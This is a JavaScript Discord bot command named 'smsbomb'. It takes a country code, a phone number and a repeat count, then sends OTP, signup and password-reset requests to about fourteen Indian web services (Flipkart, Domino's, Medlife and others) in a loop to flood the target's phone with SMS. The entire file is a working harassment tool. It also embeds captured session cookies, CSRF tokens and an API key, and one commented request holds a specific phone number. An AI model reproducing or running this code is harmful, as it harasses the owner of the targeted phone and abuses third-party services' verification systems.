const Discord = require("discord.js");
const config = require("../config.js")
const nodefetch = require('node-fetch');
const request = require("request")
exports.run = async (bot, message, args, command, db) => {
  let args3 = args.join().substring(command.length).split(" ");
  if (message.author.id !== config.botowner) {
        message.reply('this command is only for bot owner!!!');
        return undefined;
  }
  if (!args3) return message.channel.send(`please provide a valid input`)
  let cc = args3[0];
  //console.log("cc "+ cc)
  let mnumber = args3[1];
  ///console.log("mn "+ mnumber)
  let count = args3[2];
  //console.log("count "+ count)
  for (let step = 0; step < count; step++) {
    try {
      request(
      {
        url: "https://m.redbus.in/api/getOtp?number="+cc+mnumber+"&cc="+cc+"&whatsAppOpted=undefined"
      },(error, response, body) => {
        //if (error) return message.channel.send(error)
        var data = JSON.parse(body);
        })
    } catch (err) {
      ///message.channel.send(`❌ ${err}`)
    }
//--------------------------------
    /*
    fetch("https://www.redbus.in/Personalization/SendOTP?mobile=8708935302&phoneCode=91&OTPSource=SIGNIN&tok=384884431048", {
  "headers": {
    "accept": "application/json, text/javascript, *\/*; q=0.01",
    "accept-language": "en-US,en;q=0.9",
    "content-type": "application/json",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin",
    "x-requested-with": "XMLHttpRequest",
    "cookie": "deviceSessionId=263b1fcb-d944-4fb7-9423-6c150678c877; bCore=0; country=IND; currency=INR; defaultCountry=IND; language=en; lzFlag=1; selectedCurrency=INR; bft=1; jfpj=fa84044ef751a44ca7b7248b4bccb39a; tvc_smc_bus=google / organic / (not set); tvc_session_alive_bus=1; _ga=GA1.2.369047950.1590325523; _gid=GA1.2.2096190940.1590325523; _fbp=fb.1.1590325523691.1402208247; RT=\"z=1&dm=redbus.in&si=894ee521-9202-48dc-be0d-c8f532301952&ss=kal2sqxz&sl=2&tt=52o&bcn=%2F%2F684d0d40.akstat.io%2F&rl=1&ul=v9z7&hd=va0q\"; AKA_A2=A; tvc_user_type=old; gClId=369047950.1590325523; _uetsid=3214f292-97e0-226b-d946-e46f37588d69; G_ENABLED_IDPS=google; _VTok=384884431048"
  },
  "referrer": "https://www.redbus.in/login?offerType=PaymentOffers&defaultSlide=home&isOnlyMobile=false",
  "referrerPolicy": "no-referrer-when-downgrade",
  "body": null,
  "method": "GET",
  "mode": "cors"
});*/
//--------------------------------
    try {
      request(
      {
        url: "https://passport.happyeasygo.com/heg_api/user/sendRegisterOTP.do?phone="+cc+"%20"+mnumber
      },(error, response, body) => {
        //if (error) return message.channel.send(error)
        var data = JSON.parse(body);
        })
    } catch (err) {
      ///message.channel.send(`❌ ${err}`)
    }
//-------------------------
    fetch("https://api.dominos.co.in/loginhandler/forgotpassword", {
      "headers": {
        "accept": "application/json, text/plain, */*",
        "accept-language": "en-US,en;q=0.9",
        "access-control-allow-headers": "*",
        "access-control-allow-methods": "GET, POST, PATCH, PUT, DELETE, OPTIONS",
        "access-control-allow-origin": "*",
        "api_key": "X24EZOH3IL",
        "authtoken": "null",
        "client_type": "web-chrome",
        "content-type": "application/json",
        "deliverytype": "D",
        "isloggedin": "false",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "source": "NewDesktop#N/A",
        "storeid": "6585R",
        "strict-transport-security": "max-age=1621938361253",
        "userid": "undefined",
        "x-content-type-options": "nosniff",
        "x-frame-options": "mitigate"
      },
      "referrer": "https://pizzaonline.dominos.co.in/?",
      "referrerPolicy": "no-referrer-when-downgrade",
      "body": "{\"lastName\":\"\",\"mobile\":\""+mnumber+"\",\"firstName\":\"\"}",
      "method": "POST",
      "mode": "cors"
    });
//-----------------------------
    fetch("https://amplifygaming.com/home/sendotp", {
      "headers": {
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "x-requested-with": "XMLHttpRequest",
        "cookie": "ci_session=c3122b47f6703a681ad0886e8f6328c85682739a; _ga=GA1.2.379874419.1590382863; _gid=GA1.2.658214800.1590382863; _gat_gtag_UA_149370064_2=1"
      },
      "referrer": "https://amplifygaming.com/home/signup",
      "referrerPolicy": "no-referrer-when-downgrade",
      "body": "mobile="+mnumber,
      "method": "POST",
      "mode": "cors"
    });
//-----------------------------
    fetch("https://gaanajsso.indiatimes.com/sso/crossapp/identity/web/getLoginOtp", {
      "headers": {
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "channel": "gaana.com",
        "content-type": "application/json",
        "csrftoken": "",
        "csut": "",
        "gdpr": "",
        "isjssocrosswalk": "true",
        "platform": "WEB",
        "sdkversion": "0.5.7",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "cross-site",
        "ssec": "",
        "tksec": "",
        "cookie": "deviceid=3a8x7wqp8wamhfashht44xp10; lgc_deviceid=3a8x7wqp8wamhfashht44xp10"
      },
      "referrer": "https://gaana.com/",
      "referrerPolicy": "no-referrer-when-downgrade",
      "body": "{\"mobile\":\"+"+cc+"-"+mnumber+"\"}",
      "method": "POST",
      "mode": "cors"
    });
//-----------------------------
    fetch("https://www.valueshoppe.co.in/index.php?route=account/signup/sendSms", {
      "headers": {
        "accept": "application/json, text/javascript, */*; q=0.01",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/x-www-form-urlencoded",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "x-requested-with": "XMLHttpRequest",
        "cookie": "KARTROCKETSESS=sevecfs1uaet2nnuoqam40icm0; language=en; country=NA; currency=INR; customer_logged=0; tt_sid=0.7268877875852611; tid=1590383733580; device=W; _ga=GA1.4.1337864197.1590383740; _gid=GA1.4.17599295.1590383740; cem.subscriptionId=; cem.isNotificationAllowed=unknown; _fbp=fb.2.1590383745215.1985644389; display=grid; cem.recentlyViewed=3256; __atuvc=1%7C22; __atuvs=5ecb5523054d5f39000; cart=1; cart_items_cookie=%7B%223256%22%3A1000%7D; tt_event_id=145074719045223382388973861568837530931"
      },
      "referrer": "https://www.valueshoppe.co.in/index.php?route=account/signup",
      "referrerPolicy": "no-referrer-when-downgrade",
      "body": "email=&telephone="+mnumber,
      "method": "POST",
      "mode": "cors"
    });
//-----------------------------
    fetch("https://www.adda52.in/sendLandingOtp", {
      "headers": {
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "x-requested-with": "XMLHttpRequest",
        "cookie": "XSRF-TOKEN=eyJpdiI6IjlGQ2tOTWs4U2gya0lraUF0eHhsSlE9PSIsInZhbHVlIjoiTHZabUMxTndRZk15RnU0QnBnd1VSTVBnOHNaSStIanVFSHRMM0krUWhRQStrOUF3S2dKV1R1VFZFXC84VnJzSnAwaUhDMmZKY1diejI3YlpQOUFcL1VaQT09IiwibWFjIjoiMzE4MGZlYTBlN2Q0ODgzZjU5ZWRjNjJkZTY3NmM4ZWFkMGVhOTliMzU3OTM1YTRjOTc4OGI0OTM0ZjA4YzZiMyJ9; laravel_session=eyJpdiI6IkFYQTgzeUxLaURFYzN2blwvdVZhdkhBPT0iLCJ2YWx1ZSI6ImlTOUZGdEo4WmJVRDFkXC9adTduMkRyaUFLbVJ6U1FmaEt4NHlZU0t0QUxVTE5VVjJiS0pLelpRXC9hanFRQUtuVFVkTFJ1b0JQSEMwK1VcL01ONU9MZ2FnPT0iLCJtYWMiOiI0ZTViYTdlYzBjZWM5M2ExNmJhNDA2NDE5YzBiYTlmYmVlNzc4ZjBjYTEyMzUzNThiNGU2NzQ2NDU5NTI0YmQ3In0%3D; _gcl_aw=GCL.1590384283.CjwKCAjwtqj2BRBYEiwAqfzur4eholnZYdmC09BJ66CQPYXlYyDvORKg7kMTrqk6dIqAvbFZeKHy8BoCoGEQAvD_BwE; _ga=GA1.2.1065794336.1590384288; _gid=GA1.2.1492812343.1590384288; _gac_UA-27623078-3=1.1590384288.CjwKCAjwtqj2BRBYEiwAqfzur4eholnZYdmC09BJ66CQPYXlYyDvORKg7kMTrqk6dIqAvbFZeKHy8BoCoGEQAvD_BwE"
      },
      "referrer": "https://www.adda52.in/campaign/welcome-offer1?utm_source=adda52in_0398_search_generic&utm_medium=ggl_cpc&utm_matchtype=e&utm_device=m&utm_campaign=google_search&utm_adgroup=62376606127&utm_keyword=adda52&utm_creative=297386438123&utm_placement=&utm_adposition=&gclid=CjwKCAjwtqj2BRBYEiwAqfzur4eholnZYdmC09BJ66CQPYXlYyDvORKg7kMTrqk6dIqAvbFZeKHy8BoCoGEQAvD_BwE",
      "referrerPolicy": "no-referrer-when-downgrade",
      "body": "_token=Fqtu1q82ZdefBU4WQVJdQukBgj47VES2ACdWrRK2&mobile="+mnumber,
      "method": "POST",
      "mode": "cors"
    });
//-----------------------------
    fetch("https://housing.com/zeus/api/gql?compressed=true&isBot=false&source=web", {
      "headers": {
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "app-name": "desktop_web_buyer",
        "content-type": "application/json; charset=UTF-8",
        "phoenix-api-name": "LOGIN_SEND_OTP_API",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "cookie": "ssrExperiments=project_card_type%3Dproject%3Bcta_unification%3Dtrue%3Brent_whatsapp%3Dtrue%3Bremove_nearby_similar_np_listings_experiment%3Dfalse%3B; experiments=hj%3Dfalse%3Bgallery_v3%3Dtrue%3Brum%3Dfalse%3Bpost_crf_owner_properties%3Dbelow_similar_properties%3Btc_enabled%3Dtrue%3Bsentry%3Dfalse%3Bdownload_app_v3%3Dtrue%3Bpg_serp_faq%3D0%3Badpushup%3Dfalse%3B; userCity=11e12081aa78a3375087; cityUrl=new_delhi; service=buy; category=residential; _ga=GA1.2.444073608.1590384472; _gid=GA1.2.1110569028.1590384472; _psid=1; traffic=sourcemedium%3Ddirect%20%2F%20none%3B; is_return_user=false; is_return_session=false; tvc_sm_fc_new=direct%7Cnone; tvc_sm_lc=direct%7Cnone; G_ENABLED_IDPS=google; _uuid=621a352b7d1f04a8541a52443ca10f92; origin=5"
      },
      "referrer": "https://housing.com/",
      "referrerPolicy": "no-referrer-when-downgrade",
      "body": "{\"query\":\"____jrOh_jo3__jmr_jsB__jmrifjurhjsB___jsBjo3___jo3ifju9jrGgg\",\"variables\":{\"phone\":\""+mnumber+"\"}}",
      "method": "POST",
      "mode": "cors"
    });
//-----------------------------
    fetch("https://api.faasos.io/v1/otp_mobile.json", {
      "headers": {
        "accept": "application/json, text/plain, */*",
        "accept-language": "en-US,en;q=0.9",
        "brand-id": "10",
        "client-os": "WebApp-Ovenstory",
        "client-source": "10",
        "content-type": "application/json;charset=UTF-8",
        "custom-origin": "WebApp-OS-React",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "cross-site"
      },
      "referrer": "https://www.ovenstory.in/",
      "referrerPolicy": "no-referrer-when-downgrade",
      "body": "{\"mobile\":\""+mnumber+"\",\"clientSource\":10,\"brand_id\":10,\"dialing_code\":\"+"+cc+"\",\"country_code\":\"IND\"}",
      "method": "POST",
      "mode": "cors"
    });
//-----------------------------
    fetch("https://rome.api.flipkart.com/api/5/user/otp/generate", {
      "headers": {
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/x-www-form-urlencoded",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "x-user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36 OPR/68.0.3618.125 FKUA/website/42/website/Desktop",
        "cookie": "T=TI159032712446600121312692141621754018996048122341947319530241040042; AMCVS_17EB401053DAF4840A490D4C%40AdobeOrg=1; s_cc=true; AMCV_17EB401053DAF4840A490D4C%40AdobeOrg=-227196251%7CMCIDTS%7C18407%7CMCMID%7C37643220835435595964527810035577655945%7CMCAAMLH-1590931904%7C12%7CMCAAMB-1590931904%7CRKhpRz8krg2tLO6pguXWp5olkAcUniQYPHaMWWgdJ3xzPWQmdj0y%7CMCOPTOUT-1590334305s%7CNONE%7CMCAID%7CNONE; _ga=GA1.2.279933588.1590327226; _gid=GA1.2.1028662902.1590327226; gpv_pn=HomePage; gpv_pn_t=FLIPKART%3AHomePage; S=d1t17Pzt+eHN4Pwk/MiJbBT8/Py9kIK+8LV3RVEjzTBnUGDnDrBp3ubPzDAcndoLmTaCKSl9iRFqrGXLHoHEs7q0Waw==; SN=VI3FC3C53504ED41BEBB51250AB2FA4B4F.TOKEDA9265D3F404DC495A03AFF09D27FCF.1590385560.LO; s_sq=%5B%5BB%5D%5D"
      },
      "referrer": "https://www.flipkart.com/",
      "referrerPolicy": "no-referrer-when-downgrade",
      "body": "loginId=+"+cc+mnumber,
      "method": "POST",
      "mode": "cors"
    });
//-----------------------------
    fetch("https://www.clovia.com/accounts/register_with_mobile/", {
      "headers": {
        "accept": "application/json, text/plain, */*",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "multipart/form-data; boundary=----WebKitFormBoundaryWu5fWI4mnUsRFkAq",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "cookie": "comp_par=\"utm_campaign=70553\\054firstclicktime=2020-05-25 11:18:55.390857\\054utm_medium=20027\\054http_referer=https://www.google.com/\\054utm_source=10001\"; cr_id_last=None; last_source_time=\"2020-05-25 11:18:55.390754\"; last_source=10001; nur=None; data_in_visits=\"10001&2020-05-25 11:18:55.390668\\054\"; csrftoken=Uk3BGi5GDosRpAYoDzDsHXGijlsjf4lz; utm_campaign_last=70553; sessionid=6y0wzm15sc2tk7xvcrkf387ou4o5psjb; _gcl_au=1.1.541446686.1590385716; _ga=GA1.2.252713313.1590385717; _gid=GA1.2.1304952058.1590385717; _gac_UA-62869587-1=1.1590385717.CjwKCAjwtqj2BRBYEiwAqfzurwcNkUyzdpQjFfyTYZGYZMXDedWnHcXOlt0wkBTHvEThChDpUxXD_BoCL18QAvD_BwE; _gac_UA-62869587-2=1.1590385717.CjwKCAjwtqj2BRBYEiwAqfzurwcNkUyzdpQjFfyTYZGYZMXDedWnHcXOlt0wkBTHvEThChDpUxXD_BoCL18QAvD_BwE; _gcl_aw=GCL.1590385718.CjwKCAjwtqj2BRBYEiwAqfzurwcNkUyzdpQjFfyTYZGYZMXDedWnHcXOlt0wkBTHvEThChDpUxXD_BoCL18QAvD_BwE; _fbp=fb.1.1590385718374.1051466956; _hjid=ee15df4b-4d4e-466f-a22f-1dc3bc8149e2; we-nt-open=1; we-nt-exp=31754563; we_nk_show=true"
      },
      "referrer": "https://www.clovia.com/?utm_source=10001&utm_medium=20027&utm_term=clovia_brand_ppc&utm_campaign=70553&gclid=CjwKCAjwtqj2BRBYEiwAqfzurwcNkUyzdpQjFfyTYZGYZMXDedWnHcXOlt0wkBTHvEThChDpUxXD_BoCL18QAvD_BwE",
      "referrerPolicy": "no-referrer-when-downgrade",
      "body": "------WebKitFormBoundaryWu5fWI4mnUsRFkAq\r\nContent-Disposition: form-data; name=\"csrfmiddlewaretoken\"\r\n\r\nUk3BGi5GDosRpAYoDzDsHXGijlsjf4lz\r\n------WebKitFormBoundaryWu5fWI4mnUsRFkAq\r\nContent-Disposition: form-data; name=\"phone\"\r\n\r\n"+mnumber+"\r\n------WebKitFormBoundaryWu5fWI4mnUsRFkAq--\r\n",
      "method": "POST",
      "mode": "cors"
    });
//-----------------------------
    fetch("https://svc.medlife.com/ml-rest-services/v1/medlife/OTP", {
      "headers": {
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/json;charset=UTF-8",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "x-ab-test-values": "Upload-Incentivising-AB_false,Search-Elastic-Or-Algolia_true,subscription_v2_false,Search-Use-Elastic-Over-Algolia_false,green,OLD_PROMO_CODE_FLOWe,segment_coupon_false,MEDLIFE_FC,Order-Use-Tracking-v2_false,show_modal_true,Patient-AutoSuggest-PastRx-AB_true"
      },
      "referrer": "https://www.medlife.com/verifyMobile/false",
      "referrerPolicy": "no-referrer-when-downgrade",
      "body": "{\"mobileNumber\":\""+mnumber+"\"}",
      "method": "PUT",
      "mode": "cors"
    });
//-----------------------------
    fetch("https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=IN", {
      "headers": {
        "accept": "application/json, text/plain, */*",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/json",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "x-api-key": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IklCREdZMmtTTktnRnV1dVkifQ.eyJwaG9uZV9udW1iZXIiOiI4NzA4OTM1MzAyIiwiY291bnRyeV9jb2RlIjoiOTEiLCJwbGF0Zm9ybSI6IndlYiIsImV4cCI6MTU5MDQ3MzIyNTAyMn0._p9TOoiWa5bjViq-1dReWAbbGM4IekW4yptCpS2jL9k"
      },
      "referrer": "https://www.altbalaji.com/user-detail?pid=NTM%3D",
      "referrerPolicy": "no-referrer-when-downgrade",
      "body": "{\"phone_number\":\""+mnumber+"\",\"country_code\":\""+cc+"\",\"platform\":\"web\",\"exp\":1590473225022}",
      "method": "POST",
      "mode": "cors"
    });
//-----------------------------
//-----------------------------
//-----------------------------
//-----------------------------
//-----------------------------
//-----------------------------
//-----------------------------
//-----------------------------
//-----------------------------
//-----------------------------
//-----------------------------
//-----------------------------
//-----------------------------
//-----------------------------
//-----------------------------
//-----------------------------
//-----------------------------
//-----------------------------
//-----------------------------
//-----------------------------
//-----------------------------
//-----------------------------
  }
   message.channel.send('bombing...');

}

exports.conf = {
    enabled: false,
    guildOnly: false,
    aliases: ['bomb'],
    permLevel: 'for owner only',
    manu: false
};

exports.help = {
    name: 'smsbomb',
    category: 'owner-only',
    description: 'sms',
    usage: '$smsbomb'
};